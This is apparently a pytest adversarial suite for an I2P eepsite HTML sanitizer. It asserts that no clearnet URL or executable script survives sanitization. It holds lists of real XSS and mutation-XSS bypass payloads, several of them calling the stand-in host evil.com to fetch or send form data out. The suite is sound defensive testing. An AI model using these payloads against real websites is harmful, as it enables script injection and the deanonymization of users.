"""
Adversarial validation suite for the eepsite HTML sanitizer.

This is the security-acceptance corpus for the deanonymization defense.
Where test_html_sanitizer.py proves the happy-path behavior, THIS file
throws a large body of known-malicious and malformed inputs at the
sanitizer and asserts the two load-bearing invariants ALWAYS hold:

  INVARIANT 1 (no clearnet): no clearnet origin survives anywhere in the
    output in a form that could trigger an outbound request — no
    http(s)://<clearnet-host>, no //<clearnet-host>, no surviving
    reference to a known evil host.

  INVARIANT 2 (no script): no executable script survives — no <script>,
    no on* handler, no javascript:/vbscript: scheme.

The corpus draws from real XSS/mXSS filter-bypass classes: case &
whitespace tricks, attribute-quoting tricks, nested/broken tags,
namespace confusion (SVG/MathML), CSS exfil, encoded payloads, and
parser-differential ("mutation XSS") shapes. The point is not to prove
the sanitizer handles each *specific* trick perfectly, but that the
INVARIANTS survive every one — a defense-in-depth posture (parser
allowlist + injected CSP) rather than blocklist whack-a-mole.
"""
from __future__ import annotations

import re

import pytest

from scripts.html_sanitizer import sanitize_html

BASE = "http://example.i2p/page/"
EVIL_HOSTS = ("evil.com", "tracker.evil.com", "attacker.net", "1.2.3.4", "xn--evil")


def sanitize(html: str) -> str:
    out, _ = sanitize_html(html, BASE)
    return out


def assert_invariants(out: str, original: str):
    low = out.lower()

    # ── INVARIANT 1: no clearnet ────────────────────────────────────
    # No absolute http(s) URL pointing at a non-.i2p host.
    for m in re.finditer(r"https?://([a-z0-9.\-]+)", low):
        host = m.group(1)
        assert host.endswith(".i2p"), (
            f"clearnet origin survived: {m.group(0)!r}\n"
            f"  input:  {original!r}\n  output: {out!r}"
        )
    # No protocol-relative //host that isn't .i2p (would inherit https on clearnet).
    for m in re.finditer(r'(?:src|href|action|data|poster)\s*=\s*["\']?//([a-z0-9.\-]+)', low):
        host = m.group(1)
        assert host.endswith(".i2p"), f"protocol-relative clearnet survived: {m.group(0)!r}"
    # None of our known evil hosts appear at all.
    for evil in EVIL_HOSTS:
        assert evil not in low, (
            f"evil host {evil!r} survived sanitization.\n"
            f"  input:  {original!r}\n  output: {out!r}"
        )

    # ── INVARIANT 2: no script ──────────────────────────────────────
    assert "<script" not in low, f"<script> survived: {out!r}"
    assert "javascript:" not in low, f"javascript: survived: {out!r}"
    assert "vbscript:" not in low, f"vbscript: survived: {out!r}"
    # No on* event handler attribute survived. We look for `on<word>=`
    # that isn't part of a normal word. Allow the literal text content
    # (escaped) but not as an attribute.
    for m in re.finditer(r'\son[a-z]+\s*=', low):
        # Permit it only if it appears inside escaped text (i.e. preceded
        # by &lt; somewhere it can't be an attribute). Simplest strict
        # rule: there must be no raw on*= in a tag context. Since the
        # sanitizer escapes text, any on*= in output is a real attribute.
        raise AssertionError(f"event handler attribute survived: {m.group(0)!r} in {out!r}")


# ── Corpus: clearnet resource leak attempts ─────────────────────────

CLEARNET_VECTORS = [
    '<img src="https://evil.com/p.png">',
    '<img src="HTTPS://EVIL.COM/p.png">',
    '<img src="https:&#47;&#47;evil.com/p.png">',
    '<img src=" https://evil.com/p.png ">',
    '<img\nsrc\n=\n"https://evil.com/p.png">',
    '<img src=https://evil.com/p.png>',                 # unquoted
    '<img src=//evil.com/p.png>',                        # protocol-relative
    '<img\tsrc="//evil.com/x">',
    '<image href="https://evil.com/x.svg"/>',            # SVG image
    '<svg><image xlink:href="https://evil.com/x"/></svg>',
    '<use href="https://evil.com/s#i"/>',
    '<link rel=stylesheet href="https://evil.com/s.css">',
    '<link rel="preconnect" href="https://evil.com">',
    '<link rel="dns-prefetch" href="//evil.com">',
    '<link rel="prefetch" href="https://evil.com/x">',
    '<iframe src="https://evil.com"></iframe>',
    '<iframe srcdoc="<img src=https://evil.com/p>"></iframe>',
    '<object data="https://evil.com/x"></object>',
    '<embed src="https://evil.com/y">',
    '<video src="https://evil.com/v.mp4"></video>',
    '<video><source src="https://evil.com/v.mp4"></video>',
    '<audio src="https://evil.com/a.mp3"></audio>',
    '<track src="https://evil.com/t.vtt">',
    '<input type="image" src="https://evil.com/x">',
    '<form action="https://evil.com/exfil"><input name=a></form>',
    '<base href="https://evil.com/"><img src="rel.png">',
    '<meta http-equiv="refresh" content="0; url=https://evil.com">',
    '<div style="background:url(https://evil.com/bg.png)">x</div>',
    '<div style="background:url(&quot;https://evil.com/bg.png&quot;)">x</div>',
    '<style>body{background:url(https://evil.com/bg)}</style>',
    '<style>@import "https://evil.com/x.css";</style>',
    '<style>@import url(//evil.com/x.css);</style>',
    '<img srcset="https://evil.com/1x.png 1x, https://evil.com/2x.png 2x">',
    '<picture><source srcset="https://evil.com/a.png"><img src="b.png"></picture>',
    '<a href="https://evil.com">click</a>',
    '<a href="//evil.com">click</a>',
    '<body background="https://evil.com/bg.png">x</body>',
    '<table background="https://evil.com/bg.png"><tr><td>x</td></tr></table>',
]


# ── Corpus: script / handler / scheme injection attempts ────────────

SCRIPT_VECTORS = [
    '<script>fetch("https://evil.com")</script>',
    '<script src="https://evil.com/x.js"></script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<script\n>alert(1)</script>',
    '<scr<script>ipt>alert(1)</script>',                # nested/broken
    '<img src=x onerror="fetch(\'https://evil.com\')">',
    '<img src=x onerror=alert(1)>',
    '<img src=x ONERROR=alert(1)>',
    '<div onclick="leak()">x</div>',
    '<div onmouseover=alert(1)>x</div>',
    '<body onload="leak()">x</body>',
    '<svg onload="leak()"></svg>',
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<form action="javascript:leak()"><input></form>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<input onfocus=alert(1) autofocus>',
    '<details ontoggle=alert(1) open>x</details>',
    '<svg><script>alert(1)</script></svg>',
    '<math><mtext><script>alert(1)</script></mtext></math>',
    '<noscript><img src=x onerror=alert(1)></noscript>',
    '<template><script>alert(1)</script></template>',
    '<style>@import url("javascript:alert(1)");</style>',
]


# ── Corpus: malformed / parser-differential / fuzz ──────────────────

MALFORMED_VECTORS = [
    '',
    '   ',
    '<',
    '>',
    '<<<>>>',
    '<img',
    '<img src=',
    '<img src="',
    '<img src="https://evil.com/p.png',                 # unterminated attr
    '<!-- <img src=https://evil.com/p.png> -->',
    '<!--[if IE]><img src=https://evil.com/p.png><![endif]-->',
    '<div><div><div><img src=https://evil.com/p.png>',  # unclosed nesting
    '</script></style></div>',                          # stray closers
    '<img src="https://evil.com/p.png"' + " " * 5000 + ">",  # whitespace flood
    '<' + "a" * 10000 + ' src=https://evil.com>',       # huge tag name
    '<img src="https://evil.com/\x00p.png">',            # null byte
    '<img src="https://evil.com/p.png" ' + 'x="y" ' * 500 + '>',  # attr flood
    '\ufeff<img src=https://evil.com/p.png>',            # BOM prefix
    '<img src="https://evil.com/&#x70;.png">',           # entity in url
    '<div>' * 200 + '<img src=https://evil.com/p>' + '</div>' * 200,  # deep nest
]


@pytest.mark.parametrize("vec", CLEARNET_VECTORS)
def test_clearnet_vectors_neutralized(vec):
    out = sanitize(vec)
    assert_invariants(out, vec)


@pytest.mark.parametrize("vec", SCRIPT_VECTORS)
def test_script_vectors_neutralized(vec):
    out = sanitize(vec)
    assert_invariants(out, vec)


@pytest.mark.parametrize("vec", MALFORMED_VECTORS)
def test_malformed_inputs_safe_and_no_crash(vec):
    out = sanitize(vec)                 # must not raise
    assert_invariants(out, vec)
    # CSP must always be injected, even for garbage input.
    assert "Content-Security-Policy" in out


def test_combined_kitchen_sink():
    """Every vector concatenated into one document — the sanitizer must
    still emit a clearnet-free, script-free result."""
    doc = (
        "<html><head><title>evil</title></head><body>"
        + "".join(CLEARNET_VECTORS)
        + "".join(SCRIPT_VECTORS)
        + "<p>legitimate content</p>"
        + "</body></html>"
    )
    out = sanitize(doc)
    assert_invariants(out, "<kitchen-sink>")
    # Legit content survives.
    assert "legitimate content" in out
    # In-network rewriting still happened for the relative ones.
    assert "/browse" in out or "legitimate content" in out


def test_csp_always_present_across_corpus():
    for vec in CLEARNET_VECTORS + SCRIPT_VECTORS:
        out = sanitize(vec)
        assert "Content-Security-Policy" in out, f"CSP missing for {vec!r}"
        # The injected CSP must keep connect-src + script-src locked.
        assert "connect-src" in out
        assert "script-src" in out


def test_in_network_still_works_under_adversarial_mix():
    """A legit in-network image next to a clearnet one: the good one is
    rewritten to the proxy, the bad one is dropped."""
    out = sanitize('<img src="/good.png"><img src="https://evil.com/bad.png">')
    assert_invariants(out, "mix")
    assert "/browse/resource?url=" in out  # good one rewritten
